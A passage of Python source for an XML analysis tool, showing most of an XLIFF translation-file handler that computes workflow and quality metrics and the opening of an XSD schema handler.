states, metadata, and provides translation quality metrics and workflow insights.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class XLIFFHandler(XMLHandler):
    """Handler for XLIFF (XML Localization Interchange File Format) files"""
    
    XLIFF_NAMESPACES = [
        "urn:oasis:names:tc:xliff:document:1.2",
        "urn:oasis:names:tc:xliff:document:2.0",
        "urn:oasis:names:tc:xliff:document:2.1",
        "xliff.oasis-open.org"
    ]
    
    XLIFF_VERSIONS = {
        "1.2": "urn:oasis:names:tc:xliff:document:1.2",
        "2.0": "urn:oasis:names:tc:xliff:document:2.0",
        "2.1": "urn:oasis:names:tc:xliff:document:2.1"
    }
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def _find_elements_by_local_name(self, root: ET.Element, local_name: str) -> List[ET.Element]:
        """Find elements by local name, ignoring namespace prefixes"""
        return [elem for elem in root.iter() if elem.tag.split('}')[-1] == local_name]
    
    def _find_element_by_local_name(self, root: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find first element by local name, ignoring namespace prefixes"""
        for elem in root.iter():
            if elem.tag.split('}')[-1] == local_name:
                return elem
        return None
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for XLIFF namespace
        for uri in namespaces.values():
            if any(xliff_ns in uri for xliff_ns in self.XLIFF_NAMESPACES):
                return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'xliff':
            return True, 0.95
        
        # Check for XLIFF-specific elements
        ns = self._get_namespace(root)
        xliff_elements = ['file', 'trans-unit', 'source', 'target', 'body']
        found_elements = sum(1 for elem in xliff_elements 
                           if root.find(f'.//{ns}{elem}') is not None or 
                              root.find(f'.//{elem}') is not None)
        
        if found_elements >= 3:
            return True, min(found_elements * 0.25, 0.9)
        
        # Check for translation units with source/target
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        
        if trans_units:
            has_source_target = any(
                (self._find_element_by_local_name(unit, 'source') is not None and
                 self._find_element_by_local_name(unit, 'target') is not None)
                for unit in trans_units[:5]  # Check first 5
            )
            if has_source_target:
                return True, 0.8
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect XLIFF version
        version = "1.2"  # Default
        
        # Check version attribute
        if 'version' in root.attrib:
            version = root.get('version', '1.2')
        
        # Check namespace for version
        for uri in namespaces.values():
            if '2.1' in uri:
                version = "2.1"
            elif '2.0' in uri:
                version = "2.0"
            elif '1.2' in uri:
                version = "1.2"
        
        # Detect document characteristics
        ns = self._get_namespace(root)
        
        # Count translation units and files
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        files = self._find_elements_by_local_name(root, 'file')
        
        # Determine document type
        doc_type = "standard"
        if len(files) > 1:
            doc_type = "multi_file"
        elif any(unit.get('approved') == 'yes' for unit in trans_units):
            doc_type = "approved_translation"
        elif any(unit.get('translate') == 'no' for unit in trans_units):
            doc_type = "mixed_translation"
        
        # Determine complexity
        total_units = len(trans_units)
        complexity = "simple" if total_units < 100 else "medium" if total_units < 1000 else "complex"
        
        # Detect workflow state
        workflow_state = "new"
        states = [unit.get('state', 'new') for unit in trans_units if unit.get('state')]
        if states:
            if 'final' in states or 'signed-off' in states:
                workflow_state = "final"
            elif 'translated' in states or 'reviewed' in states:
                workflow_state = "in_progress"
            elif 'needs-translation' in states:
                workflow_state = "pending"
        
        return DocumentTypeInfo(
            type_name="XLIFF Translation",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "XLIFF",
                "category": "localization",
                "document_type": doc_type,
                "complexity": complexity,
                "workflow_state": workflow_state,
                "translation_units": total_units,
                "file_count": len(files)
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'file_info': self._analyze_file_info(root),
            'translation_files': self._analyze_translation_files(root),
            'translation_units': self._analyze_translation_units(root),
            'languages': self._analyze_languages(root),
            'workflow_state': self._analyze_workflow_state(root),
            'translation_memory': self._analyze_translation_memory(root),
            'notes_comments': self._analyze_notes_and_comments(root),
            'quality_metrics': self._calculate_quality_metrics(root),
            'localization_metadata': self._analyze_localization_metadata(root),
            'translation_tools': self._analyze_tool_information(root)
        }
        
        recommendations = [
            "Validate translation completeness and consistency",
            "Review untranslated and fuzzy segments",
            "Implement quality assurance checks",
            "Standardize translation memory usage",
            "Optimize translator workflow and tools",
            "Implement terminology management",
            "Add linguistic validation rules",
            "Track translation progress and metrics",
            "Integrate with CAT tools and TMS systems",
            "Generate localization reports and analytics"
        ]
        
        ai_use_cases = [
            "Automated translation quality assessment",
            "Machine translation post-editing workflows",
            "Translation memory optimization",
            "Terminology extraction and consistency checking",
            "Workflow automation for localization projects",
            "Translation progress tracking and reporting",
            "Quality estimation for machine translations",
            "Multilingual content analysis and insights",
            "CAT tool integration and optimization",
            "Localization project management automation"
        ]
        
        return SpecializedAnalysis(
            document_type="XLIFF Translation",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_files': findings['translation_files']['file_count'],
                'translation_units': findings['translation_units']['unit_count'],
                'source_language': findings['languages']['source_language'],
                'target_languages': len(findings['languages']['target_languages']),
                'translated_units': findings['workflow_state']['translated_count'],
                'completion_rate': findings['quality_metrics']['completion_rate']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_translation_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'translation_project': self._extract_project_metadata(root),
            'translation_catalog': self._extract_translation_catalog(root),
            'language_pairs': self._extract_language_pairs(root),
            'workflow_status': self._extract_workflow_status(root),
            'translation_statistics': self._extract_translation_statistics(root)
        }
    
    def _analyze_file_info(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze XLIFF file information"""
        file_info = {
            'version': root.get('version', '1.2'),
            'xmlns': root.get('xmlns'),
            'tool_id': None,
            'tool_name': None,
            'tool_version': None,
            'date': None,
            'generator': None
        }
        
        # Extract tool information from header or attributes
        header = self._find_element_by_local_name(root, 'header')
        if header is not None:
            tool = self._find_element_by_local_name(header, 'tool')
            if tool is not None:
                file_info['tool_id'] = tool.get('tool-id')
                file_info['tool_name'] = tool.get('tool-name')
                file_info['tool_version'] = tool.get('tool-version')
        
        # Check for generator or creation info
        file_info['generator'] = root.get('generator') or root.get('tool-id')
        file_info['date'] = root.get('date') or root.get('created')
        
        return file_info
    
    def _analyze_translation_files(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze translation file structure"""
        files_info = {
            'file_count': 0,
            'files': [],
            'source_languages': set(),
            'target_languages': set(),
            'original_files': []
        }
        
        files = self._find_elements_by_local_name(root, 'file')
        files_info['file_count'] = len(files)
        
        for file in files:
            file_data = {
                'original': file.get('original'),
                'source_language': file.get('source-language'),
                'target_language': file.get('target-language'),
                'datatype': file.get('datatype'),
                'tool_id': file.get('tool-id'),
                'date': file.get('date'),
                'translation_units': len(self._find_elements_by_local_name(file, 'trans-unit'))
            }
            
            # Track languages
            if file_data['source_language']:
                files_info['source_languages'].add(file_data['source_language'])
            if file_data['target_language']:
                files_info['target_languages'].add(file_data['target_language'])
            
            # Track original files
            if file_data['original']:
                files_info['original_files'].append(file_data['original'])
            
            files_info['files'].append(file_data)
        
        files_info['source_languages'] = list(files_info['source_languages'])
        files_info['target_languages'] = list(files_info['target_languages'])
        
        return files_info
    
    def _analyze_translation_units(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze translation units"""
        units_info = {
            'unit_count': 0,
            'units': [],
            'states': {},
            'approved_count': 0,
            'locked_count': 0,
            'fuzzy_count': 0,
            'empty_targets': 0,
            'identical_source_target': 0
        }
        
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        units_info['unit_count'] = len(trans_units)
        
        for unit in trans_units[:200]:  # Limit for performance
            unit_data = {
                'id': unit.get('id'),
                'state': unit.get('state', 'new'),
                'approved': unit.get('approved') == 'yes',
                'locked': unit.get('locked') == 'yes',
                'translate': unit.get('translate', 'yes') == 'yes',
                'resname': unit.get('resname'),
                'source_text': None,
                'target_text': None,
                'notes': []
            }
            
            # Extract source text
            source = self._find_element_by_local_name(unit, 'source')
            if source is not None:
                unit_data['source_text'] = self._extract_text_content(source)
            
            # Extract target text
            target = self._find_element_by_local_name(unit, 'target')
            if target is not None:
                unit_data['target_text'] = self._extract_text_content(target)
                if target.get('state'):
                    unit_data['state'] = target.get('state')
            
            # Extract notes
            for note in self._find_elements_by_local_name(unit, 'note'):
                note_data = {
                    'content': note.text,
                    'from': note.get('from'),
                    'priority': note.get('priority')
                }
                unit_data['notes'].append(note_data)
            
            # Track statistics
            if unit_data['approved']:
                units_info['approved_count'] += 1
            if unit_data['locked']:
                units_info['locked_count'] += 1
            if unit_data['state'] in ['needs-review-translation', 'fuzzy-match']:
                units_info['fuzzy_count'] += 1
            if not unit_data['target_text'] or not unit_data['target_text'].strip():
                units_info['empty_targets'] += 1
            if (unit_data['source_text'] and unit_data['target_text'] and 
                unit_data['source_text'].strip() == unit_data['target_text'].strip()):
                units_info['identical_source_target'] += 1
            
            # Track states
            state = unit_data['state']
            units_info['states'][state] = units_info['states'].get(state, 0) + 1
            
            units_info['units'].append(unit_data)
        
        return units_info
    
    def _analyze_languages(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze language information"""
        lang_info = {
            'source_language': None,
            'target_languages': [],
            'language_pairs': [],
            'multilingual': False
        }
        
        # Extract from file elements
        files = self._find_elements_by_local_name(root, 'file')
        source_langs = set()
        target_langs = set()
        
        for file in files:
            src_lang = file.get('source-language')
            tgt_lang = file.get('target-language')
            
            if src_lang:
                source_langs.add(src_lang)
            if tgt_lang:
                target_langs.add(tgt_lang)
                
            if src_lang and tgt_lang:
                pair = f"{src_lang}->{tgt_lang}"
                if pair not in lang_info['language_pairs']:
                    lang_info['language_pairs'].append(pair)
        
        # Set primary languages
        if source_langs:
            lang_info['source_language'] = list(source_langs)[0]
        lang_info['target_languages'] = list(target_langs)
        
        # Check if multilingual
        lang_info['multilingual'] = len(target_langs) > 1 or len(source_langs) > 1
        
        return lang_info
    
    def _analyze_workflow_state(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze translation workflow state"""
        workflow_info = {
            'total_units': 0,
            'new_count': 0,
            'translated_count': 0,
            'reviewed_count': 0,
            'approved_count': 0,
            'final_count': 0,
            'needs_work_count': 0,
            'completion_percentage': 0.0,
            'state_distribution': {}
        }
        
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        workflow_info['total_units'] = len(trans_units)
        
        for unit in trans_units:
            state = unit.get('state', 'new')
            
            # Normalize state names
            if state in ['translated', 'final', 'signed-off']:
                workflow_info['translated_count'] += 1
            elif state in ['needs-review-translation', 'needs-review-l10n']:
                workflow_info['reviewed_count'] += 1
            elif state in ['final', 'signed-off']:
                workflow_info['final_count'] += 1
            elif state == 'new':
                workflow_info['new_count'] += 1
            elif state in ['needs-translation', 'needs-adaptation']:
                workflow_info['needs_work_count'] += 1
            
            # Check approved attribute
            if unit.get('approved') == 'yes':
                workflow_info['approved_count'] += 1
            
            # Track state distribution
            workflow_info['state_distribution'][state] = \
                workflow_info['state_distribution'].get(state, 0) + 1
        
        # Calculate completion percentage
        if workflow_info['total_units'] > 0:
            completed = workflow_info['translated_count'] + workflow_info['final_count']
            workflow_info['completion_percentage'] = (completed / workflow_info['total_units']) * 100
        
        return workflow_info
    
    def _analyze_translation_memory(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze translation memory information"""
        tm_info = {
            'has_tm_matches': False,
            'match_types': {},
            'match_scores': [],
            'leveraged_matches': 0,
            'fuzzy_matches': 0,
            'exact_matches': 0
        }
        
        # Look for TM match information in alt-trans elements
        alt_trans = self._find_elements_by_local_name(root, 'alt-trans')
        tm_info['has_tm_matches'] = len(alt_trans) > 0
        
        for alt in alt_trans:
            match_quality = alt.get('match-quality')
            origin = alt.get('origin')
            
            if match_quality:
                try:
                    score = int(match_quality)
                    tm_info['match_scores'].append(score)
                    
                    if score == 100:
                        tm_info['exact_matches'] += 1
                    elif score >= 75:
                        tm_info['fuzzy_matches'] += 1
                    else:
                        tm_info['leveraged_matches'] += 1
                except ValueError:
                    pass
            
            if origin:
                tm_info['match_types'][origin] = tm_info['match_types'].get(origin, 0) + 1
        
        return tm_info
    
    def _analyze_notes_and_comments(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze notes and comments"""
        notes_info = {
            'note_count': 0,
            'notes': [],
            'note_sources': {},
            'priority_levels': {},
            'translator_notes': 0,
            'reviewer_notes': 0
        }
        
        notes = self._find_elements_by_local_name(root, 'note')
        notes_info['note_count'] = len(notes)
        
        for note in notes:
            note_data = {
                'content': note.text,
                'from': note.get('from'),
                'priority': note.get('priority'),
                'annotates': note.get('annotates')
            }
            
            # Track note sources
            if note_data['from']:
                notes_info['note_sources'][note_data['from']] = \
                    notes_info['note_sources'].get(note_data['from'], 0) + 1
                
                if 'translator' in note_data['from'].lower():
                    notes_info['translator_notes'] += 1
                elif 'reviewer' in note_data['from'].lower():
                    notes_info['reviewer_notes'] += 1
            
            # Track priority levels
            if note_data['priority']:
                notes_info['priority_levels'][note_data['priority']] = \
                    notes_info['priority_levels'].get(note_data['priority'], 0) + 1
            
            notes_info['notes'].append(note_data)
        
        return notes_info
    
    def _analyze_localization_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze localization-specific metadata"""
        l10n_info = {
            'datatypes': set(),
            'original_formats': set(),
            'encoding_info': None,
            'phase_info': [],
            'tool_chain': []
        }
        
        # Extract datatypes from file elements
        files = self._find_elements_by_local_name(root, 'file')
        for file in files:
            datatype = file.get('datatype')
            if datatype:
                l10n_info['datatypes'].add(datatype)
            
            original = file.get('original')
            if original:
                # Extract file extension as format indicator
                if '.' in original:
                    ext = original.split('.')[-1].lower()
                    l10n_info['original_formats'].add(ext)
        
        # Extract phase information
        phases = self._find_elements_by_local_name(root, 'phase')
        for phase in phases:
            phase_data = {
                'phase_name': phase.get('phase-name'),
                'process_name': phase.get('process-name'),
                'company_name': phase.get('company-name'),
                'tool_id': phase.get('tool-id'),
                'date': phase.get('date')
            }
            l10n_info['phase_info'].append(phase_data)
        
        # Extract tool chain information
        tools = self._find_elements_by_local_name(root, 'tool')
        for tool in tools:
            tool_data = {
                'tool_id': tool.get('tool-id'),
                'tool_name': tool.get('tool-name'),
                'tool_version': tool.get('tool-version'),
                'tool_company': tool.get('tool-company')
            }
            l10n_info['tool_chain'].append(tool_data)
        
        l10n_info['datatypes'] = list(l10n_info['datatypes'])
        l10n_info['original_formats'] = list(l10n_info['original_formats'])
        
        return l10n_info
    
    def _analyze_tool_information(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze translation tool information"""
        tool_info = {
            'primary_tool': None,
            'tool_count': 0,
            'tool_versions': {},
            'workflow_tools': []
        }
        
        # Extract from header tools
        tools = self._find_elements_by_local_name(root, 'tool')
        tool_info['tool_count'] = len(tools)
        
        for tool in tools:
            tool_name = tool.get('tool-name')
            tool_version = tool.get('tool-version')
            
            if tool_name and not tool_info['primary_tool']:
                tool_info['primary_tool'] = tool_name
            
            if tool_name and tool_version:
                tool_info['tool_versions'][tool_name] = tool_version
            
            tool_data = {
                'id': tool.get('tool-id'),
                'name': tool_name,
                'version': tool_version,
                'company': tool.get('tool-company')
            }
            tool_info['workflow_tools'].append(tool_data)
        
        # Also check file-level tool information
        files = self._find_elements_by_local_name(root, 'file')
        for file in files:
            tool_id = file.get('tool-id')
            if tool_id and tool_id not in [t['id'] for t in tool_info['workflow_tools']]:
                tool_info['workflow_tools'].append({
                    'id': tool_id,
                    'name': None,
                    'version': None,
                    'company': None
                })
        
        return tool_info
    
    def _calculate_quality_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate translation quality metrics"""
        metrics = {
            'completion_rate': 0.0,
            'approval_rate': 0.0,
            'review_rate': 0.0,
            'empty_target_rate': 0.0,
            'identical_rate': 0.0,
            'leverage_rate': 0.0,
            'average_match_score': 0.0
        }
        
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        total_units = len(trans_units)
        
        if total_units == 0:
            return metrics
        
        translated_count = 0
        approved_count = 0
        reviewed_count = 0
        empty_targets = 0
        identical_count = 0
        
        for unit in trans_units:
            state = unit.get('state', 'new')
            approved = unit.get('approved') == 'yes'
            
            # Count completion states
            if state in ['translated', 'final', 'signed-off']:
                translated_count += 1
            if approved:
                approved_count += 1
            if state in ['needs-review-translation', 'needs-review-l10n']:
                reviewed_count += 1
            
            # Check target content
            target = self._find_element_by_local_name(unit, 'target')
            source = self._find_element_by_local_name(unit, 'source')
            
            if target is not None:
                target_text = self._extract_text_content(target)
                if not target_text or not target_text.strip():
                    empty_targets += 1
                elif source is not None:
                    source_text = self._extract_text_content(source)
                    if source_text and target_text and source_text.strip() == target_text.strip():
                        identical_count += 1
        
        # Calculate rates
        metrics['completion_rate'] = (translated_count / total_units) * 100
        metrics['approval_rate'] = (approved_count / total_units) * 100
        metrics['review_rate'] = (reviewed_count / total_units) * 100
        metrics['empty_target_rate'] = (empty_targets / total_units) * 100
        metrics['identical_rate'] = (identical_count / total_units) * 100
        
        # Calculate TM leverage
        alt_trans = self._find_elements_by_local_name(root, 'alt-trans')
        if alt_trans:
            match_scores = []
            for alt in alt_trans:
                match_quality = alt.get('match-quality')
                if match_quality:
                    try:
                        match_scores.append(int(match_quality))
                    except ValueError:
                        pass
            
            if match_scores:
                metrics['average_match_score'] = sum(match_scores) / len(match_scores)
                metrics['leverage_rate'] = (len([s for s in match_scores if s >= 75]) / len(match_scores)) * 100
        
        return metrics
    
    def _extract_text_content(self, element: ET.Element) -> str:
        """Extract text content from element, handling inline tags"""
        if element.text:
            text = element.text
        else:
            text = ""
        
        # Handle inline elements and their tail text
        for child in element:
            if child.tail:
                text += child.tail
        
        return text.strip()
    
    def _extract_project_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract project-level metadata"""
        metadata = {
            'version': root.get('version'),
            'xmlns': root.get('xmlns'),
            'tool_id': root.get('tool-id'),
            'file_count': len(self._find_elements_by_local_name(root, 'file')),
            'total_units': len(self._find_elements_by_local_name(root, 'trans-unit')),
            'creation_date': None,
            'project_id': None
        }
        
        # Extract creation date from various sources
        header = self._find_element_by_local_name(root, 'header')
        if header is not None:
            metadata['creation_date'] = header.get('creation-date')
        
        # Extract project identifier
        files = self._find_elements_by_local_name(root, 'file')
        if files:
            # Use first file's original as project indicator
            metadata['project_id'] = files[0].get('original', '').split('/')[-1]
        
        return metadata
    
    def _extract_translation_catalog(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract translation catalog"""
        catalog = []
        
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        for unit in trans_units[:100]:  # Limit for performance
            source = self._find_element_by_local_name(unit, 'source')
            target = self._find_element_by_local_name(unit, 'target')
            
            entry = {
                'id': unit.get('id'),
                'source': self._extract_text_content(source) if source is not None else None,
                'target': self._extract_text_content(target) if target is not None else None,
                'state': unit.get('state', 'new'),
                'approved': unit.get('approved') == 'yes',
                'resname': unit.get('resname')
            }
            catalog.append(entry)
        
        return catalog
    
    def _extract_language_pairs(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract language pair information"""
        pairs = []
        
        files = self._find_elements_by_local_name(root, 'file')
        for file in files:
            pair = {
                'source_language': file.get('source-language'),
                'target_language': file.get('target-language'),
                'original_file': file.get('original'),
                'datatype': file.get('datatype'),
                'unit_count': len(self._find_elements_by_local_name(file, 'trans-unit'))
            }
            pairs.append(pair)
        
        return pairs
    
    def _extract_workflow_status(self, root: ET.Element) -> Dict[str, Any]:
        """Extract workflow status information"""
        status = {
            'overall_state': 'new',
            'phase_info': [],
            'completion_stats': {},
            'last_modified': None
        }
        
        # Analyze overall state based on unit states
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        states = [unit.get('state', 'new') for unit in trans_units]
        
        if states:
            state_counts = {}
            for state in states:
                state_counts[state] = state_counts.get(state, 0) + 1
            
            status['completion_stats'] = state_counts
            
            # Determine overall state
            if 'final' in states or 'signed-off' in states:
                status['overall_state'] = 'final'
            elif 'translated' in states:
                status['overall_state'] = 'translated'
            elif 'needs-review-translation' in states:
                status['overall_state'] = 'review'
            
        # Extract phase information
        phases = self._find_elements_by_local_name(root, 'phase')
        for phase in phases:
            phase_data = {
                'name': phase.get('phase-name'),
                'process': phase.get('process-name'),
                'date': phase.get('date'),
                'company': phase.get('company-name')
            }
            status['phase_info'].append(phase_data)
        
        return status
    
    def _extract_translation_statistics(self, root: ET.Element) -> Dict[str, Any]:
        """Extract translation statistics"""
        stats = {
            'total_words': 0,
            'translated_words': 0,
            'source_word_count': 0,
            'target_word_count': 0,
            'character_counts': {
                'source': 0,
                'target': 0
            },
            'segment_counts': {
                'total': 0,
                'translated': 0,
                'approved': 0,
                'locked': 0
            }
        }
        
        trans_units = self._find_elements_by_local_name(root, 'trans-unit')
        stats['segment_counts']['total'] = len(trans_units)
        
        for unit in trans_units:
            state = unit.get('state', 'new')
            approved = unit.get('approved') == 'yes'
            locked = unit.get('locked') == 'yes'
            
            if state in ['translated', 'final', 'signed-off']:
                stats['segment_counts']['translated'] += 1
            if approved:
                stats['segment_counts']['approved'] += 1
            if locked:
                stats['segment_counts']['locked'] += 1
            
            # Count words and characters
            source = self._find_element_by_local_name(unit, 'source')
            target = self._find_element_by_local_name(unit, 'target')
            
            if source is not None:
                source_text = self._extract_text_content(source)
                if source_text:
                    stats['source_word_count'] += len(source_text.split())
                    stats['character_counts']['source'] += len(source_text)
            
            if target is not None:
                target_text = self._extract_text_content(target)
                if target_text:
                    stats['target_word_count'] += len(target_text.split())
                    stats['character_counts']['target'] += len(target_text)
        
        stats['total_words'] = stats['source_word_count']
        stats['translated_words'] = stats['target_word_count']
        
        return stats
    
    def _assess_translation_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess translation quality metrics"""
        metrics = {
            'completeness': 0.0,
            'consistency': 0.0,
            'workflow_health': 0.0,
            'localization_readiness': 0.0,
            'overall': 0.0
        }
        
        # Completeness (based on translation progress)
        quality_data = findings['quality_metrics']
        metrics['completeness'] = quality_data['completion_rate'] / 100.0
        
        # Consistency (based on identical content and empty targets)
        consistency_score = 1.0
        if quality_data['empty_target_rate'] > 0:
            consistency_score -= (quality_data['empty_target_rate'] / 100.0) * 0.5
        if quality_data['identical_rate'] > 20:  # Too many identical source/target
            consistency_score -= ((quality_data['identical_rate'] - 20) / 100.0) * 0.3
        
        metrics['consistency'] = max(0.0, consistency_score)
        
        # Workflow health (based on review and approval rates)
        workflow_score = 0.0
        if quality_data['review_rate'] > 0:
            workflow_score += 0.3
        if quality_data['approval_rate'] > 0:
            workflow_score += 0.4
        if quality_data['leverage_rate'] > 0:
            workflow_score += 0.3
        
        metrics['workflow_health'] = workflow_score
        
        # Localization readiness
        l10n_data = findings['localization_metadata']
        notes_data = findings['notes_comments']
        
        readiness_score = 0.5  # Base score
        if l10n_data['datatypes']:
            readiness_score += 0.2
        if l10n_data['phase_info']:
            readiness_score += 0.2
        if notes_data['note_count'] > 0:
            readiness_score += 0.1
        
        metrics['localization_readiness'] = min(readiness_score, 1.0)
        
        # Overall quality
        metrics['overall'] = (
            metrics['completeness'] * 0.4 +
            metrics['consistency'] * 0.25 +
            metrics['workflow_health'] * 0.2 +
            metrics['localization_readiness'] * 0.15
        )
        
        return metrics
</file>

<file path="src/handlers/xsd_handler.py">
#!/usr/bin/env python3
"""
XSD (XML Schema Definition) Handler

Analyzes XML Schema files to extract type definitions, validation rules,
and structural constraints for data quality and validation purposes.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class XSDSchemaHandler(XMLHandler):
    """Handler for XML Schema Definition files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for schema elements
        if root.tag.endswith('schema') or root.tag == 'schema':
            # Check for XSD namespace
            if any('XMLSchema' in uri for uri in namespaces.values()):
                return True, 1.0
            return True, 0.7
            
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        target_namespace = root.get('targetNamespace', 'none')
        version = root.get('version', '1.0')
        
        # Check if it's a specific schema type
        schema_type = "Generic XSD"
        if 'w3.org' in target_namespace:
            schema_type = "W3C Standard Schema"
        elif 'maven' in target_namespace.lower():
            schema_type = "Maven XSD"
        elif 'spring' in target_namespace.lower():
            schema_type = "Spring Framework XSD"
        
        return DocumentTypeInfo(
            type_name="XML Schema Definition",
            confidence=1.0,
            version=version,
            schema_uri=target_namespace,
            metadata={
                "standard": "W3C XSD",
                "category": "schema_definition",
                "target_namespace": target_namespace,
                "schema_type": schema_type
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'types': self._analyze_types(root),
            'elements': self._analyze_elements(root),
            'attributes': self._analyze_attributes(root),
            'validation_rules': self._extract_validation_rules(root),
            'namespaces': self._analyze_namespaces(root),
            'imports': self._find_imports(root),
            'complexity_metrics': self._calculate_complexity(root)
        }
        
        recommendations = [
            "Generate sample valid/invalid XML for testing",
            "Extract validation rules for data quality checks",
            "Create documentation from annotations",
            "Identify reusable type definitions",
            "Check for overly restrictive constraints",
            "Monitor schema evolution over time"
        ]
        
        ai_use_cases = [
            "Automated test data generation",
            "Schema evolution tracking",
            "Data quality rule extraction",
            "Documentation generation",
            "Schema compatibility checking",
            "Type system analysis",
            "Validation rule optimization",
            "Schema migration assistance"
        ]
        
        return SpecializedAnalysis(
            document_type="XML Schema Definition",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'complex_types': len(findings['types']['complex']),
                'simple_types': len(findings['types']['simple']),
                'global_elements': len(findings['elements']['global']),
                'global_attributes': len(findings['attributes']['global']),
                'validation_rules': len(findings['validation_rules'])
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_schema_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'type_definitions': self._extract_type_definitions(root),
            'element_definitions': self._extract_element_definitions(root),
            'validation_constraints': self._extract_constraints(root),
            'documentation': self._extract_documentation(root),
            'schema_metadata': {
                'target_namespace': root.get('targetNamespace'),
                'element_form_default': root.get('elementFormDefault', 'unqualified'),
                'attribute_form_default': root.get('attributeFormDefault', 'unqualified'),
                'version': root.get('version')
            }
        }
    
    def _analyze_types(self, root: ET.Element) -> Dict[str, List[Dict[str, Any]]]:
        complex_types = []
        simple_types = []
        
        # Extract complex types
        for ct in root.findall('.//{http://www.w3.org/2001/XMLSchema}complexType'):
            complex_types.append({
                'name': ct.get('name', 'anonymous'),
                'abstract': ct.get('abstract', 'false') == 'true',
                'mixed': ct.get('mixed', 'false') == 'true',
                'base': self._find_base_type(ct),
                'elements': len(ct.findall('.//{http://www.w3.org/2001/XMLSchema}element')),
                'attributes': len(ct.findall('.//{http://www.w3.org/2001/XMLSchema}attribute'))
            })
        
        # Extract simple types  
        for st in root.findall('.//{http://www.w3.org/2001/XMLSchema}simpleType'):
            simple_types.append({
                'name': st.get('name', 'anonymous'),
                'base': self._find_restriction_base(st),
                'constraints': self._extract_simple_constraints(st)
            })
            
        return {'complex': complex_types, 'simple': simple_types}
    
    def _analyze_elements(self, root: ET.Element) -> Dict[str, Any]:
        global_elements = []
        local_elements = []
        
        # Global elements (direct children of schema)
        for elem in root.findall('./{http://www.w3.org/2001/XMLSchema}element'):
            global_elements.append({
                'name': elem.get('name'),
                'type': elem.get('type'),
                'nillable': elem.get('nillable', 'false') == 'true',
                'abstract': elem.get('abstract', 'false') == 'true',
                'substitution_group': elem.get('substitutionGroup')
            })
        
        # Count local elements
        all_elements = root.findall('.//{http://www.w3.org/2001/XMLSchema}element')
        local_count = len(all_elements) - len(global_elements)
        
        return {
            'global': global_elements,
            'local_count': local_count,
            'total': len(all_elements)
        }
    
    def _analyze_attributes(self, root: ET.Element) -> Dict[str, Any]:
        global_attrs = []
        
        # Global attributes
        for attr in root.findall('./{http://www.w3.org/2001/XMLSchema}attribute'):
            global_attrs.append({
                'name': attr.get('name'),
                'type': attr.get('type'),
                'use': attr.get('use', 'optional'),
                'default': attr.get('default')
            })
        
        # Attribute groups
        attr_groups = root.findall('.//{http://www.w3.org/2001/XMLSchema}attributeGroup[@name]')
        
        return {
            'global': global_attrs,
            'groups': [{'name': ag.get('name')} for ag in attr_groups],
            'total': len(root.findall('.//{http://www.w3.org/2001/XMLSchema}attribute'))
        }
    
    def _extract_validation_rules(self, root: ET.Element) -> List[Dict[str, Any]]:
        rules = []
        
        # Extract all restrictions
        for restriction in root.findall('.//{http://www.w3.org/2001/XMLSchema}restriction'):
            base = restriction.get('base', 'unknown')
            constraints = {}
            
            # Common facets
            facets = ['minLength', 'maxLength', 'pattern', 'enumeration', 
                     'minInclusive', 'maxInclusive', 'minExclusive', 'maxExclusive',
                     'totalDigits', 'fractionDigits', 'whiteSpace']
            
            for facet in facets:
                elements = restriction.findall(f'.//{{http://www.w3.org/2001/XMLSchema}}{facet}')
                if elements:
